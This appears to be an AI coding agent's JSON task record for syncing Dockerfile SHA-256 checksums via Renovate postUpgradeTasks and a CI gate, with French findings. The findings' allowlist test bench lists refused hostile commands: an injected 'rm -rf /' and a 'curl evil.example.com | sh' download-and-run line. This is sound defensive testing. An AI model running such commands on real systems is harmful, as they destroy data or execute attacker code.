{
  "id": "FEAT-003",
  "type": "ci",
  "description": "Wire the FEAT-002 script into Renovate and CI, and remove the root cause. Three coupled changes plus docs: (1) renovate.json loses the currentDigest capture group that is breaking four separate Renovate updates today, and gains a postUpgradeTasks entry that runs the sync script on the Renovate branch so the corrected checksum lands in the Renovate commit and stays visible in the PR diff; (2) renovate.yml gains RENOVATE_ALLOWED_COMMANDS so the self-hosted run is actually permitted to execute that command, which is an admin-level setting and cannot live in renovate.json; (3) pr-validation.yml gains a fast checksum-verification job so that if postUpgradeTasks ever fails to run, the PR fails early with an explicit mismatch message instead of an opaque sha256sum error buried in a 300 MB build. Depends on FEAT-002.",
  "status": "completed",
  "steps": [
    "In renovate.json, change customManagers[0].matchStrings to stop capturing the checksum. Remove the `\\nARG \\w+_SHA256=(?<currentDigest>[a-f0-9]{64})` tail so the pattern only captures datasource, depName and currentValue. Rationale to put in the file or the commit message: none of the datasources in use (golang-version, github-releases, github-tags, custom) can resolve a tarball SHA-256 as a digest, and the consequences are live and observable in Dependency Dashboard issue #4 today: branch renovate/kubernetes-kubernetes-digest is erroring while trying to write a kubernetes/kubernetes GIT commit SHA (f54c212) into KUBECTL_SHA256, and Renovate reports 'Could not determine new digest for update' for googleworkspace/cli and cli/cli plus 'Failed to look up custom package devin-cli: no-result', meaning gws, gh and devin have been silently receiving no updates at all.",
    "After the edit, confirm the manager still extracts all five tools. Run `npx --yes --package renovate@44.61.6 renovate-config-validator renovate.json` and additionally verify the regex against the real Dockerfile independently, for example with a short `node -e` snippet that applies the same pattern with the same flags and prints the five (depName, currentValue) pairs. Expected pairs: googleworkspace/cli 0.22.5, cli/cli 2.99.0, kubernetes/kubernetes 1.37.0, devin-cli 3000.6.7, golang 1.27.0. If fewer than five match, the regex is wrong; fix it before moving on.",
    "Add a postUpgradeTasks block to renovate.json: commands running the sync script scoped to the upgraded dependency (pass the Renovate template for the dependency name, e.g. `node scripts/sync-download-checksums.mjs --write --only={{{depName}}}`), fileFilters limited to `Dockerfile` so Renovate only commits that file back, and an executionMode appropriate for per-dependency scoping (`update`, so the command runs once per upgrade with depName populated; if you determine from the Renovate 44.61.6 schema that `branch` mode is required for this to be honoured, use `branch` and drop the --only scoping so all five are verified instead, and record the reason in findings). Scope the block so it applies to the Dockerfile updates and cannot fire on unrelated updates in a harmful way; note that FEAT-002 already guarantees an unrecognised --only value is a no-op with exit 0, so an Action or base-image upgrade cannot fail the task.",
    "Address the config migration that Dependency Dashboard issue #4 explicitly asks for, since we are editing this file anyway and a pending migration prompt adds noise to the dashboard: change `extends: [\"config:base\"]` to `[\"config:recommended\"]` and rename customManagers[0].fileMatch to managerFilePatterns with the value expressed in the current syntax. Confirm with the validator that no 'Config migration necessary' WARN remains. If the validator shows that either rename changes behaviour in a way you cannot verify, leave it as-is and record why in findings rather than guessing.",
    "Do NOT reintroduce `automerge: true` at the root, `requiredStatusChecks: []`, or `ignoreTests: true`. PR #18 (S-05) deliberately removed all three so automerge is per-rule and conditional on the CI check passing, and AGENTS.md forbids weakening it. The whole value of this change is that the checksum gate and the build gate actually block a bad automerge, which `ignoreTests` would defeat. Verify by reading the final renovate.json that none of those three keys is present.",
    "In .github/workflows/renovate.yml, add RENOVATE_ALLOWED_COMMANDS to the existing `env:` block of the 'Self-hosted Renovate' step, set to a JSON array of one anchored regex that matches only the sync script invocation and nothing else (a permissive pattern here is an arbitrary-command-execution hole in a workflow holding a PAT, so anchor it and do not use a bare wildcard). Add a comment explaining that allowedCommands is admin-level config that cannot be set from renovate.json, and that it is what permits postUpgradeTasks to run. Do not touch the token wiring and do not add RENOVATE_AUTOMERGE.",
    "Confirm the script can actually execute inside the Renovate runner image, rather than assuming it. Pull the image the action uses and run the script in --check mode inside it against the repo, for example `docker run --rm -v $PWD:/w -w /w --entrypoint node ghcr.io/renovatebot/renovate:44.61.6 scripts/sync-download-checksums.mjs --check`. This proves both that Node is present at the expected path and that the script's zero-dependency constraint holds in that environment. If the exact tag is unavailable, use the closest available 44.x tag and record which one in findings. If the image cannot be pulled at all, record that as a gap in findings and fall back to verifying with the local Node 22, noting that the runtime assumption is unproven.",
    "In .github/workflows/pr-validation.yml, add a job (for example `checksums`) that runs before the image build: checkout, actions/setup-node pinned by commit SHA in the same style as the existing pins in this file (every uses: line in this repo is pinned to a full SHA with a version comment, match that convention exactly), then `node scripts/sync-download-checksums.mjs --check`. Make `build-and-verify` depend on it via `needs:` so a stale checksum fails in seconds instead of after the ~300 MB Go download. Keep `permissions: contents: read`. Add a comment explaining that this job is the backstop for postUpgradeTasks and that it turns an opaque `sha256sum -c` build failure into an explicit named mismatch.",
    "Validate the two workflow files parse as YAML (for example with a `node -e` js-yaml-free check using `python3 -c 'import yaml,sys;yaml.safe_load(open(...))'`, python3 is available) and re-read them to confirm indentation and job wiring are correct. Confirm the existing steps of build-and-verify are unchanged apart from the added `needs:`.",
    "Confirm the interaction with .github/workflows/auto-release.yml: it triggers a calver release on any push to main that changes Dockerfile. A Renovate bump now changes two lines of the Dockerfile instead of one, which is still a Dockerfile change, so the behaviour is unchanged; state this explicitly in findings after reading the workflow, and flag it if you find it computes anything from the diff that a second changed line would break.",
    "Update AGENTS.md: extend rule 5 so it documents that each pinned version ARG is paired with a machine-maintained `ARG <TOOL>_SHA256` which must never be hand-edited, and that the way to refresh it is `node scripts/sync-download-checksums.mjs --write`. In the Renovate section, document that postUpgradeTasks + RENOVATE_ALLOWED_COMMANDS are what keep the pair in sync, that removing either silently reintroduces the blocked-PR failure, and add the upstream checksum source per tool from context.json key_patterns including the warning that go.dev has no per-tarball .sha256 file. Keep the existing French tone and formatting of the file.",
    "Update README.md to describe the mechanism for external readers: the five downloads are SHA-256 verified at build time against values committed in the repo, those values are kept in sync with the pinned versions by scripts/sync-download-checksums.mjs which cross-checks the upstream published checksum against a freshly computed hash of the artifact, and CI re-verifies them on every PR. Match the existing README structure and language.",
    "Run the full local equivalent of CI one final time on the branch: the validator, `node scripts/sync-download-checksums.mjs --check`, `docker build`, the five smoke commands, and the entrypoint/arch assertions.",
    "Record in findings: the final renovate.json customManager regex and the five pairs it extracted, the exact postUpgradeTasks and RENOVATE_ALLOWED_COMMANDS values chosen with the reasoning for executionMode, the result of running the script inside the Renovate container, the validator output showing no pending migration, and confirmation that automerge/ignoreTests/requiredStatusChecks were not weakened.",
    "Commit with a Conventional Commits message, for example `ci(renovate): synchroniser le SHA-256 avec la version via postUpgradeTasks + garde CI`. Include renovate.json, both workflow files, AGENTS.md, README.md and the .agents/ state."
  ],
  "acceptance_criteria": [
    "renovate.json no longer contains the string `currentDigest`.",
    "The customManager regex, applied to the real Dockerfile, extracts exactly five (depName, currentValue) pairs: googleworkspace/cli 0.22.5, cli/cli 2.99.0, kubernetes/kubernetes 1.37.0, devin-cli 3000.6.7, golang 1.27.0.",
    "renovate.json contains a postUpgradeTasks block invoking scripts/sync-download-checksums.mjs with fileFilters limited to Dockerfile.",
    "`npx --yes --package renovate@44.61.6 renovate-config-validator renovate.json` reports 'Config validated successfully', shows no ERROR, and shows no 'Config migration necessary' WARN.",
    "renovate.json contains none of: root `automerge`, `ignoreTests`, `requiredStatusChecks`.",
    ".github/workflows/renovate.yml sets RENOVATE_ALLOWED_COMMANDS to an anchored regex matching only the sync script invocation, and does not set RENOVATE_AUTOMERGE.",
    ".github/workflows/pr-validation.yml has a job running `node scripts/sync-download-checksums.mjs --check` that build-and-verify declares in `needs:`, with every `uses:` pinned to a full commit SHA plus version comment like the existing steps.",
    "Both modified workflow files parse as valid YAML.",
    "The script runs successfully in --check mode inside the ghcr.io/renovatebot/renovate 44.x image, or the inability to do so is explicitly recorded in findings.",
    "AGENTS.md documents the machine-maintained SHA256 ARG, the refresh command, and the per-tool upstream checksum sources including the go.dev caveat.",
    "README.md describes the checksum synchronisation mechanism.",
    "`docker build` exits 0, the five smoke commands exit 0, entrypoint equals [\"/opt/hermes/docker/entrypoint-dispatch.sh\"], architecture equals amd64.",
    "The Dockerfile is byte-identical to main (the branch delivers the mechanism, not the Go bump)."
  ],
  "verification": [
    "grep -c currentDigest renovate.json ; echo 'expected 0 matches'",
    "npx --yes --package renovate@44.61.6 renovate-config-validator renovate.json",
    "python3 -c \"import yaml;yaml.safe_load(open('.github/workflows/pr-validation.yml'));yaml.safe_load(open('.github/workflows/renovate.yml'));print('yaml ok')\"",
    "node scripts/sync-download-checksums.mjs --check",
    "docker run --rm -v \"$PWD\":/w -w /w --entrypoint node ghcr.io/renovatebot/renovate:44.61.6 scripts/sync-download-checksums.mjs --check",
    "docker build -t hermes-leo-custom:feat003 . && docker run --rm --entrypoint gws hermes-leo-custom:feat003 --version && docker run --rm --entrypoint gh hermes-leo-custom:feat003 --version && docker run --rm --entrypoint kubectl hermes-leo-custom:feat003 version --client && docker run --rm --entrypoint devin hermes-leo-custom:feat003 --version && docker run --rm --entrypoint go hermes-leo-custom:feat003 version",
    "docker image inspect hermes-leo-custom:feat003 --format '{{json .Config.Entrypoint}}' && docker image inspect hermes-leo-custom:feat003 --format '{{.Architecture}}'",
    "git diff --exit-code main -- Dockerfile ; echo 'expected no Dockerfile change vs main'"
  ],
  "blocked_reason": null,
  "findings": "Câblage Renovate + CI livré sur la branche fix/renovate-checksum-sync. Dockerfile BYTE-IDENTIQUE à main (`git diff --exit-code main -- Dockerfile` sort 0) : cette branche livre le MÉCANISME, pas le bump Go. Fichiers modifiés : renovate.json, .github/workflows/renovate.yml, .github/workflows/pr-validation.yml, AGENTS.md, README.md.\n\n=== 1. renovate.json — customManager final, sans currentDigest ===\n`grep -c currentDigest renovate.json` -> 0 (grep exit 1 = absent du fichier).\nRegex finale (matchStrings[0], une seule entrée) :\n  # renovate: datasource=(?<datasource>[^\\s]+) depName=(?<depName>[^\\s]+)\\nARG \\w+_VERSION=(?<currentValue>[^\\s]+)\nÉcart assumé vs le plan : le plan disait de retirer la queue `\\nARG \\w+_SHA256=(?<currentDigest>…)`, ce qui est fait ; en plus, `ARG \\w+=` est resserré en `ARG \\w+_VERSION=` pour que le manager ne puisse jamais accrocher une autre ligne ARG si le bloc était réordonné. La convention `<OUTIL>_VERSION` / `<OUTIL>_SHA256` est celle des 5 outils, elle est documentée dans la règle 5 d'AGENTS.md et c'est aussi celle que le script exige au parsing.\n`managerFilePatterns: [\"/^Dockerfile$/\"]` (forme migrée, avec les délimiteurs slash).\n\nVÉRIFICATION INDÉPENDANTE DE LA REGEX contre le vrai Dockerfile (node, même motif + flag g lus depuis renovate.json) — 5 paires sur 5, exactement les attendues, et plus aucun groupe currentDigest :\n  1. datasource=github-releases depName=googleworkspace/cli   currentValue=0.22.5     currentDigest=(aucun)\n  2. datasource=github-releases depName=cli/cli               currentValue=2.99.0     currentDigest=(aucun)\n  3. datasource=github-tags     depName=kubernetes/kubernetes  currentValue=1.37.0     currentDigest=(aucun)\n  4. datasource=custom          depName=devin-cli              currentValue=3000.6.7   currentDigest=(aucun)\n  5. datasource=golang-version  depName=golang                 currentValue=1.27.0     currentDigest=(aucun)\n  total pairs: 5\n\n=== 2. postUpgradeTasks retenu (valeur exacte) ===\nPlacé DANS la packageRule des 5 binaires (matchPackageNames: googleworkspace/cli, cli/cli, kubernetes/kubernetes, devin-cli, golang), et nulle part ailleurs :\n  \"postUpgradeTasks\": {\n    \"commands\": [\"node scripts/sync-download-checksums.mjs --write --only={{{depName}}}\"],\n    \"fileFilters\": [\"Dockerfile\"],\n    \"executionMode\": \"update\"\n  }\nRAISONNEMENT executionMode=update, vérifié dans le code de renovate 44.61.6 (dist/workers/repository/update/branch/execute-post-upgrade-commands.js) et pas seulement dans la doc :\n  - ligne 220 : en mode `branch`, la tâche est passée au niveau branche, donc SANS contexte d'upgrade -> `{{{depName}}}` ne serait pas peuplé et le scoping `--only=` tomberait à l'eau ;\n  - ligne 222 : `config.upgrades.filter(({postUpgradeTasks}) => !postUpgradeTasks?.executionMode || postUpgradeTasks.executionMode === \"update\")` -> en mode `update` la commande est exécutée une fois PAR upgrade, chaque commande étant compilée avec `mergeChildConfig(config, upgrade)`, donc `{{{depName}}}` est bien peuplé. `update` est donc le mode correct et le repli vers `branch` (décrit comme option de secours par le plan) n'a PAS été nécessaire.\n  - ligne 69 : `cwd` = `localDir` (racine du dépôt cloné), donc `node scripts/sync-download-checksums.mjs` résout. En plus, le script résout le Dockerfile via `import.meta.url`, donc il est insensible au cwd.\n  - `fileFilters: [\"Dockerfile\"]` : Renovate ne recommite QUE le Dockerfile (défaut `**/*` beaucoup trop large).\n  - Le scoping ne peut pas faire échouer un upgrade hors périmètre : la règle ne matche que les 5 depName, et de toute façon FEAT-002 garantit qu'un `--only=` inconnu sort 0 sans rien écrire.\n\n=== 3. RENOVATE_ALLOWED_COMMANDS retenu (valeur exacte) ===\nDans le bloc env: de l'étape « Self-hosted Renovate » de .github/workflows/renovate.yml :\n  RENOVATE_ALLOWED_COMMANDS: '[\"^node scripts/sync-download-checksums\\\\.mjs --write --only=[A-Za-z0-9._/-]+$\"]'\n(YAML simple-quote -> la chaîne JSON contient `\\\\.`, qui après JSON.parse donne le regex `\\.` correctement échappé — vérifié par exécution.)\nPourquoi ancré : dans le code, ligne 85, le test est `allowedCommands.some((pattern) => regEx(pattern).test(compiledCmd))`, c'est-à-dire une recherche NON ancrée sur la commande DÉJÀ compilée. Sans `^…$`, un motif partiel autoriserait n'importe quelle commande contenant la sous-chaîne. Ce workflow porte un PAT : un motif permissif y serait un trou d'exécution de commande arbitraire.\nBANC D'ESSAI (python re.search avec le motif réellement lu via yaml.safe_load + json.loads du fichier) :\n  AUTORISE 'node scripts/sync-download-checksums.mjs --write --only=golang'\n  AUTORISE 'node scripts/sync-download-checksums.mjs --write --only=googleworkspace/cli'\n  AUTORISE 'node scripts/sync-download-checksums.mjs --write --only=cli/cli'\n  AUTORISE 'node scripts/sync-download-checksums.mjs --write --only=kubernetes/kubernetes'\n  AUTORISE 'node scripts/sync-download-checksums.mjs --write --only=devin-cli'\n  REFUSE   'node scripts/sync-download-checksums.mjs --write --only=golang; rm -rf /'\n  REFUSE   'node scripts/sync-download-checksums.mjs --write'\n  REFUSE   'node scripts/sync-download-checksumsXmjs --write --only=golang'\n  REFUSE   'curl http://evil.example.com/x.sh | sh'\n  REFUSE   'echo pwned'\nLes 5 depName réels passent, l'injection / le lookalike / la commande arbitraire sont refusés. Défense en profondeur supplémentaire : `allowShellExecutorForPostUpgradeCommands` n'est pas activé, donc la commande est exécutée SANS shell et les métacaractères ne sont pas interprétés.\n`RENOVATE_AUTOMERGE` toujours absent du workflow (vérifié : 'RENOVATE_AUTOMERGE present: False'), token wiring intact (`token: ${{ secrets.RENOVATE_TOKEN }}` inchangé).\n\n=== 4. Migration de config — plus aucun WARN ===\n`npx --yes --package renovate@44.61.6 renovate-config-validator renovate.json` :\n   INFO: Validating renovate.json as global config\n   INFO: Config validated successfully against 1 file(s)\n  VALIDATOR_EXIT=0\nZéro ligne ERROR, et surtout ZÉRO « Config migration necessary » / « Config migration diff » : les deux WARN relevés en FEAT-001 ont disparu. Appliqué exactement la forme migrée annoncée par le validateur : extends [\"config:base\"] -> [\"config:recommended\"], et customManagers[0].fileMatch [\"^Dockerfile$\"] -> managerFilePatterns [\"/^Dockerfile$/\"].\nLE VALIDATEUR N'EST PAS VACUELLEMENT VERT (contrôle explicite) : en injectant `packageRules[1].totallyNotAnOption` dans une copie, il sort 1 avec « Invalid configuration option: packageRules[1].totallyNotAnOption ». Il accepte donc `postUpgradeTasks` dans packageRules en connaissance de cause ; confirmé côté schéma : l'option `postUpgradeTasks` n'a pas de `parents` restrictif dans dist/config/options/index.js (ligne 166), seuls ses enfants commands/fileFilters/executionMode ont `parents: [\"postUpgradeTasks\"]`.\n\n=== 5. Automerge NON affaibli (S-05 préservé) ===\nClés racine finales : $schema, extends, customDatasources, customManagers, packageRules, pinDigests, automergeType, prBodyColumns.\n  root.automerge present: false\n  root.ignoreTests present: false\n  root.requiredStatusChecks present: false\n  `grep -n -E 'ignoreTests|requiredStatusChecks' renovate.json` -> aucune occurrence (exit 1) dans TOUT le fichier.\nL'automerge reste explicite, dépendance par dépendance (3 packageRules), et conditionné au vert de la CI. Rien n'a été retiré ou assoupli : les 3 règles d'automerge existantes sont intactes, seule la description de la règle des binaires a été enrichie et le bloc postUpgradeTasks ajouté.\n\n=== 6. Le script tourne DANS le conteneur Renovate (prouvé, pas supposé) ===\nTag exact demandé disponible : `docker pull ghcr.io/renovatebot/renovate:44.61.6` -> PULL_EXIT=0 (aucun repli sur un autre 44.x nécessaire).\n  docker run --rm -v \"$PWD\":/w -w /w --entrypoint node ghcr.io/renovatebot/renovate:44.61.6 --version -> v24.20.0 (node présent sur le PATH, à l'emplacement attendu)\n  docker run --rm -v \"$PWD\":/w -w /w --entrypoint node ghcr.io/renovatebot/renovate:44.61.6 scripts/sync-download-checksums.mjs --check :\n    GWS      0.22.5     OK       de78ecdbd2f1a84cca0063a7ecbc440240fc14b6ebccbb17f4646b792a8c5c1f\n    GH       2.99.0     OK       ed4960225d2833e04a61590d9fa2b5773d147f3aa375459e5466a40c102f3832\n    KUBECTL  1.37.0     OK       6129359f4e1f3848a5572ccb0b26cf28b8ca08cef38c95a765b2f64a2c961a2f\n    DEVIN    3000.6.7   OK       f88edacea692553910d72f275515bd0b52b5d271d55250981b0c41011142d27b\n    GO       1.27.0     OK       675c26c449cbb18fc24b74650de1eabbae6e16f64326fd85a283fb3b58280685\n    Résumé : 5 outil(s) vérifié(s), 0 écart(s).\n    CONTAINER_CHECK_EXIT=0\n  La contrainte « zéro dépendance » tient donc bien dans cet environnement (Node 24 du conteneur, sans package.json ni node_modules).\n  BONUS — la commande EXACTE de postUpgradeTasks, dans ce même conteneur :\n    node scripts/sync-download-checksums.mjs --write --only=golang -> 'GO 1.27.0 OK' + 'Résumé : 1 outil(s) vérifié(s), 0 ligne(s) ARG _SHA256 réécrite(s), Dockerfile inchangé.', CONTAINER_WRITE_EXIT=0, `git diff --exit-code -- Dockerfile` = 0. Le mode écriture fonctionne donc aussi depuis le conteneur (droits sur le volume monté inclus) et reste idempotent.\n\n=== 7. Garde CI dans pr-validation.yml ===\nNouveau job `checksums` (runs-on ubuntu-latest, timeout-minutes: 10) : checkout -> actions/setup-node@820762786026740c76f36085b0efc47a31fe5020 # v7 (node-version 22) -> `node scripts/sync-download-checksums.mjs --check`. SHA obtenu via `gh api repos/actions/setup-node/tags` (v7.0.0 et v7 pointent tous deux sur 820762786026740c76f36085b0efc47a31fe5020), pinné en SHA complet + commentaire de version, exactement comme les 6 autres `uses:` du fichier.\n`build-and-verify` déclare `needs: checksums`. Le diff du job build-and-verify ne contient QUE cette ligne `needs:` ajoutée : ses 7 étapes (checkout, buildx, build, smoke, entrypoint/arch, Trivy informatif, Trivy bloquant) sont inchangées. `permissions: contents: read` conservé au niveau workflow.\nParsing YAML des deux fichiers modifiés (python3 + PyYAML) : « yaml ok ». jobs = ['checksums', 'build-and-verify'], build-and-verify needs = 'checksums', étapes du job checksums = ['Checkout repository', 'Set up Node.js', 'Vérifier les SHA-256 des 5 téléchargements'], commande du gate = `node scripts/sync-download-checksums.mjs --check`.\nNOTE ENV : PyYAML n'était pas installé dans ce sandbox (la commande de vérification du plan échouait sur ModuleNotFoundError) ; installé avec `pip install pyyaml` (6.0.3). Rien d'ajouté au dépôt.\n\n=== 8. Interaction avec auto-release.yml : AUCUN changement de comportement (vérifié, pas déduit) ===\nLe workflow se déclenche sur `push: branches:[main], paths:[\"Dockerfile\"]`. Un bump Renovate change maintenant DEUX lignes du Dockerfile au lieu d'une, ce qui reste un changement de Dockerfile : le déclencheur et l'étape « Skip if Dockerfile unchanged since last release » (`git diff --quiet \"$LAST_TAG\" -- Dockerfile`) se comportent à l'identique.\nLa seule étape qui CALCULE quelque chose depuis le diff est « Build release notes », via `git diff \"$LAST_TAG\" -- Dockerfile | grep -E '^[+-]ARG [A-Z_]+=' | sed -E 's/^[+-]ARG ([A-Z_]+)=.*/\\1/' | sort -u`. Rejoué localement sur un dépôt jetable reproduisant le bump go 1.27.0 -> 1.27.1 AVEC la ligne GO_SHA256 resynchronisée :\n  ARG changes détectés : GO_VERSION   (GO_SHA256 n'apparaît PAS)\n  Notes générées : « - `GO_VERSION` : `1.27.0` -> `1.27.1` »\nExplication : la classe de caractères `[A-Z_]+` exige que le nom d'ARG entier jusqu'au `=` soit en A-Z_ ; `GO_SHA256` contient des chiffres, donc la ligne n'est jamais capturée. Les notes de release restent donc propres (versions uniquement, pas de hash de 64 caractères), sans aucune modification d'auto-release.yml. Rien dans ce workflow n'est cassé par une seconde ligne modifiée.\n\n=== 9. CI locale complète rejouée une dernière fois sur la branche ===\n  validator                                    -> exit 0, « Config validated successfully », 0 ERROR, 0 WARN de migration\n  node scripts/sync-download-checksums.mjs --check (node v22.23.2 local) -> 5/5 OK, « Résumé : 5 outil(s) vérifié(s), 0 écart(s). », CHECK_EXIT=0\n  docker build -t hermes-leo-custom:feat003 .   -> BUILD_EXIT=0, 17 STEP, image 5ede1589354f — MÊME ID QUE LA BASELINE FEAT-001, ce qui reconfirme que le Dockerfile est inchangé\n  smoke, les 5, tous exit 0 : gws 0.22.5 / gh version 2.99.0 (2026-09-01) / Client Version: v1.37.0 + Kustomize v5.8.1 / devin 3000.6.7 (260a97c8) / go version go1.27.0 linux/amd64\n  entrypoint -> [\"/opt/hermes/docker/entrypoint-dispatch.sh\"] (conforme) ; architecture -> amd64 (conforme)\n  git diff --exit-code main -- Dockerfile -> 0\nTrivy reste non installé localement : les 2 étapes Trivy demeurent une vérification CI uniquement (déjà noté en FEAT-001, hors critères de cette feature).\n\n=== 10. Documentation ===\nAGENTS.md : règle 5 étendue (le trio commentaire renovate + ARG _VERSION + ARG _SHA256 est indissociable, le _SHA256 est maintenu par MACHINE et ne doit JAMAIS être édité à la main, commandes --check / --write / --write --only=, contrainte « sans dépendance » à ne pas casser). Nouvelle sous-section « Synchronisation version ↔ SHA-256 (ne pas casser) » dans la section Renovate : les deux réglages indispensables (postUpgradeTasks + RENOVATE_ALLOWED_COMMANDS), le fait que retirer l'un des deux échoue en SILENCE, l'interdiction de réintroduire currentDigest avec les 3 symptômes observés, un tableau des sources amont par outil, et l'avertissement go.dev (pas de .sha256 par archive, l'URL rend du HTML). Ton et mise en forme français conservés.\nREADME.md : nouvelle section « Vérification des téléchargements (SHA-256) » (vérification avant extraction = S-01, contre-vérification amont vs hash recalculé, les 2 commandes, script sans dépendance, les 2 garde-fous Renovate/CI) ; la section Renovate précise l'enchaînement checksums -> build-and-verify et le piège n°3 explique pourquoi le checksum n'est pas capturé comme un digest.\n\nBACKLOG APRÈS CETTE FEATURE — RIEN N'EST BLOQUÉ. Les 3 features de la tâche sont terminées ; il ne reste que des actions hors code, impossibles depuis ce sandbox (ni push, ni PR, ni suppression de branche distante), à traiter par l'orchestrateur / l'utilisateur : (a) pousser fix/renovate-checksum-sync et ouvrir la PR ; (b) après merge, relancer `gh workflow run renovate.yml` (exigé par AGENTS.md après tout changement de config Renovate) — c'est ce run qui reproposera golang 1.27.1, cette fois avec le SHA-256 corrigé dans le même commit ; (c) supprimer la branche distante obsolète renovate/nousresearch-hermes-agent-2026.x puis relancer renovate.yml pour débloquer le bump d'image de base v2026.8.16 -> v2026.8.27 ; (d) fermer le doublon de Dependency Dashboard (#1 obsolète, #4 courant) ; (e) la PR #26 existante peut être fermée, son bump sera reproposé proprement. Amélioration cosmétique optionnelle et non requise, à ne pas traiter dans cette PR : rien à corriger dans auto-release.yml, le point 8 montre que ses notes ignorent déjà les ARG _SHA256."
}
